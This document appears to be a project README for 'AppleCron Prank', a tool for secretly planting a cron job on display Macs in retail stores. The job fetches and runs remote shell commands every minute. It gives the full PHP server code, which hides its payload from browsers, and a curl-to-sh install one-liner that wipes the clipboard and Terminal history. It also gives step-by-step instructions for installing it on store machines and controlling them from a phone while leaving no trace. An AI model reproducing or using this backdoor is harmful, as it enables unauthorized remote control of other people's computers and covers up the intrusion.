#AppleCron Prank

##Original idea

[Antonio Roberts / @hellocatfood](http://www.hellocatfood.com/) suggested an AppleStore prank in [this tweet](https://twitter.com/hellocatfood/status/695605824815788033)


##The idea
Going further, I found out that one can remote control machines using cron jobs, bash scripts and some php pages.

The idea is to create a cron job which will, at a certain interval, retrieve the commands to be executed .

Some examples of what can be achieved:
- Reboot
- Shutdown
- Close Safari or any other app
- Open a web page in the default browser.
- Take a snapshot.
- Upload files
- Add new cron jobs
- Update a cron job
- Remove a cron job
- Remove all cron jobs (in case you want to leave no trace)

##Overview

The first part consist in adding a cron job to a machine.
Then this job will run every x minutes and retrieve the command to be executed.
You can later update the script remotely through a web page and take control/execute scripts on the machine.
The cron job can later be removed remotely, leaving no trace.

Note : I assume that the the index.php is hosted at the root of your domain.
If not the case, change yourdomain.ext for yourdomain.ext/folder in the examples and in the code

###In details

I'm using a multipurpose php page which will serve the scripts.
This page does three things :

1- Send fake information when not accessed via curl
2- Deliver the installation script
3- Deliver other scripts stored in a script.txt file

```
<?php
header("Content-type: text/plain");

// if this page is accessed with anything else than curl, we stop here
if (stripos($_SERVER['HTTP_USER_AGENT'], "curl") === false) {
  exit("Nothing to see here");
} 

// Installation command
if (isset($_GET["i"])) {
       print '(crontab -l; echo "* * * * * curl -sL meth.fr | sh") | crontab -;echo " " | pbcopy;history -c;reset' . PHP_EOL;
}
// Prank commands
else {
    $file = fopen("script.txt", "r") or die("open http://retailpoisoning.tumblr.com/");
    echo fread($file,filesize("script.txt"));
}
?>
```

The installation script is returned when accessing the index.php page via curl, with the ?i argument.
For instance, if the index.php is at the root level of your domain :
yourdomain.ext?i

The command script is returned when accessing the page via curl without any argument :
For instance, if the index.php is at the root level of your domain :
yourdomain.ext

Any request sent from anything else than curl will be filtered out.

##How those scripts get executed on the machine
To achieve that, we use curl and pipe it to either the clipboard or bash

Typing this command ...
```
 curl -sL yourdomain.ext?i | pbcopy
 ```
... will retrieve the following installation script and copy it to the clipboard: 
```
 (crontab -l ; echo " * * * * * curl -s -L yourdomain.ext | sh") | crontab  -; echo "" | pbcopy; history -c; reset
```

Pasting this command will create a cron job executed every minute. The rest of the command deletes the content of the clipboard, clears the Terminal history and resets it.

This cron job will get other scripts (we access the page without the ?i argument) every minute and pipe it to bash for execution.

Starting from here you can do almost anything that doesn't require administrator right (when sudo is not needed), including bash commands, AppleScript commands, etc etc.

The script.txt file can be updated on the fly using the x.php page.
This means once your cron job is running you can change the script (and thus the commands run every minute) from your smartphone.

To avoid this script being indexed or accessible to others, you can set a pass key that you pass as an argument : ie: http://yourdomain.ext/x.php?xyz=abc

The x.php page is just an interface which sends updated commands to the update.php page, in charge of updating the script.txt file :

There are some predefined command but there is also a text field to enter any other command.
Note : you can also update the x.php page if you want to customize it with your own commands and pass key


##How to proceed

First, you need access to the machine to be able to add this cron job.
So head to your local retailler, pick a MacOSX machine and do this :

- Open a Terminal window
- Type this command to copy the install command to the clipboard
```
curl -sL yourdomain.ext?i | pbcopy
```
- Then CTRL+V to execute it
- Exit Terminal
- Move away then use your smartphone (or do it offsite) to launch commands through the x.php page.

Note : be carefull with the command's syntax because when cron cannot execute a script, it will be logged in /var/mail/%username% and thus will leave a trace.


##More about cron jobs

Remove all cron jobs
```
crontab -r
```

Append a new job to the existing ones
```
(crontab -l 2>/dev/null; echo " */2 * * * * open fortune.com/2016/01/19/apple-child-labor/") | crontab -
```

Replace cron jobs with a new one
```
(crontab -l | echo " * * * * * open fortune.com/2016/01/19/apple-child-labor/") | crontab -
```

Replace a specific job (ie: the one containing "fortune")
```
(crontab -l 2>/dev/null;  echo "*/4 * * * * http://techcrunch.com/2016/01/19/apple-microsoft-samsung-and-other-tech-firms-implicated-in-child-labor-report/ | grep -v 'fortune.com' | crontab -") | crontab -
```

It may be worth having a look at AppleScripting for more fun.


##Further ideas

This can be used:
- regularly push info from your machine to a server.
- track a stolen Mac.
- prank your friends/colleagues


